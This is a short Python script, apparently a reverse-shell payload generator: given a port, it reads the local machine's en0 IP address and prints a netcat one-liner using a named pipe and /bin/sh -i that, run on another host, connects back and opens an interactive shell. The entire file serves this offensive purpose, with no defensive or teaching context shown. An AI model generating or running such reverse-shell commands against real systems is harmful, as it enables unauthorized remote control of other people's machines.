import os
import argparse

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("port", type=int)
    args = parser.parse_args()

    print(f"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {os.popen('ipconfig getifaddr en0').read().strip()} {args.port} > /tmp/f")

if __name__ == "__main__":
    main()